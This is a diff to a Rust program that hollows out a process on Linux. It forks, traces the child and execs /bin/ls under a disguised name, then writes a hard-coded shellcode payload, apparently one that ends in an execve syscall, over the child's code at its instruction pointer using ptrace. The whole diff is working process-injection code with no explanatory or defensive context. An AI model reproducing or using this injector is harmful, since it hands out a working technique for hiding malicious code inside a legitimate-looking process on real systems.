@@ -1,7 +1,8 @@
 use std::ffi::CString;
 use nix::libc;
+use nix::sys::signal::Signal;
 use nix::unistd::{fork , ForkResult, execve};
-use nix::sys::ptrace;
+use nix::sys::{ptrace, wait};
 use nix::sys::wait::waitpid;
 
 fn main() {   
@@ -13,15 +14,15 @@ fn main() {
         0x6d,0x69,0x00,0x56,0x57,0x54,0x5e,0x6a,0x3b,0x58,0x0f,0x05
     ];
 
+    let binary = "/bin/ls";
+    let binary_name = "/bin/ls hollowed";
+
     match unsafe { fork() } {
         Ok(ForkResult::Child) => { 
             if ptrace::traceme().is_ok() {
-                println!("I'm the child!");
-
-                println!("Running ls with execve...");
-                let executable = CString::new("/bin/ls").unwrap();
-                // Name the process "Hollowed"
-                let arg1 = CString::new("Hollowed").unwrap();
+                println!("Running {} with execve...", binary);
+                let executable = CString::new(binary).unwrap();
+                let arg1 = CString::new(binary_name).unwrap();
                 let args = [
                     arg1.as_c_str(), 
                 ];
@@ -33,42 +34,35 @@ fn main() {
             }
          },
         Ok(ForkResult::Parent { child, ..}) => {
-            println!("I'm the parent!, My child is {}", child);
+            println!("Child process spawned as PID {}", child);
             
             /* Wait for the child to be stopped */
-            match waitpid(child, None) {
-                Ok(status) => {
-                    println!("Child stopped: {:?}", status);
-                    match ptrace::getregs(child) {
-                        Ok(regs) => {
-                            println!("RIP: {:#x}", regs.rip);
+            let status = waitpid(child, None).unwrap();
+            if status  == wait::WaitStatus::Stopped(child, Signal::SIGTRAP) {
+                println!("Child Process ({}) Trapped", child);
 
-                            println!("Writing shellcode to child process...");
-                            let mut addr = regs.rip as usize;
+                let regs = ptrace::getregs(child).unwrap();
 
-                            for chunk in shellcode.chunks(std::mem::size_of::<i64>()) {
-                                let mut padded = [0u8; std::mem::size_of::<i64>()];
-                                padded[..chunk.len()].copy_from_slice(chunk);
+                println!("RIP: {:#x}", regs.rip);
 
-                                let value = i64::from_ne_bytes(padded);
+                println!("Writing shellcode to child process...");
+                let mut addr = regs.rip as usize;
 
-                                match ptrace::write(child, addr as *mut libc::c_void, value as i64) {
-                                    Ok(_) => {
-                                        println!("Wrote chunk to {:#x}: {:#x}", addr, value);
-                                    }
-                                    Err(e) => {
-                                        println!("Failed to write shellcode at {:#x}: {}", addr, e);
-                                        return;
-                                    }
-                                }
+                for chunk in shellcode.chunks(std::mem::size_of::<i64>()) {
+                    let mut padded = [0u8; std::mem::size_of::<i64>()];
+                    padded[..chunk.len()].copy_from_slice(chunk);
 
-                                addr += std::mem::size_of::<i64>();
-                            }
-                        },
-                        Err(e) => println!("Failed to get registers: {}", e),
+                    let value = i64::from_ne_bytes(padded);
+
+                    let written = ptrace::write(child, addr as *mut libc::c_void, value as i64);
+                    if written.is_ok() {
+                        println!("Wrote chunk to {:#x}: {:#x}", addr, value);
+                    } else {
+                        println!("Failed to write chunk to {:#x}", addr);
+                        return;
                     }
-                },
-                Err(e) => println!("Waitpid failed: {}", e),
+                    addr += std::mem::size_of::<i64>();
+                }
             }
         },
         Err(e) => println!("Fork failed: {}", e),
